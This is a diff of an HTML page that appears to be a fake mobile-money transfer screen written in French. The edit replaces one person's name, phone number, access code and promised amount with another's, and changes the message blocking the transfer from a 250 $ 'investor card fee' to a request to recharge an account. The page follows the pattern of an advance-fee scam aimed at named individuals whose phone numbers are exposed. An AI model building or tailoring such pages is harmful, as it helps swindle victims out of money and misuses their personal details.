@@ -177,17 +177,17 @@
     <form id="tmoneyForm" onsubmit="return false;">
       <div class="form-group">
         <label for="name">Nom et Prénom</label>
-        <input type="text" id="name" value="Mukaza Dieumerci" disabled />
+        <input type="text" id="name" value="Christian Muzumbe" disabled />
       </div>
 
       <div class="form-group">
         <label for="phone">Numéro</label>
-        <input type="tel" id="phone" value="+243 995 385 289 " disabled />
+        <input type="tel" id="phone" value="+243 972 669 602" disabled />
       </div>
 
       <div class="form-group">
         <label for="amount">Montant à recevoir</label>
-        <input type="text" id="amount" value="1 100 $" disabled />
+        <input type="text" id="amount" value="1 200 $" disabled />
       </div>
 
       <button class="btn" type="button" onclick="startProgress()">Procéder</button>
@@ -202,7 +202,7 @@
       </div>
 
       <div class="notification-message" id="notificationMessage">
-        ⚠️ Veuillez payer les frais de carte d'investisseur qui sont de 250 $ pour terminer la transaction.
+        ⚠️ Veuillez recharger votre compte afin de terminer la transaction.
       </div>
     </form>
   </div>
@@ -212,7 +212,7 @@
       const code = document.getElementById("accessCode").value;
       const error = document.getElementById("accessError");
 
-      if (code === "5289") {
+      if (code === "9602") {
         error.style.display = "none";
         document.getElementById("accessContainer").style.display = "none";
         document.getElementById("formContainer").style.display = "block";
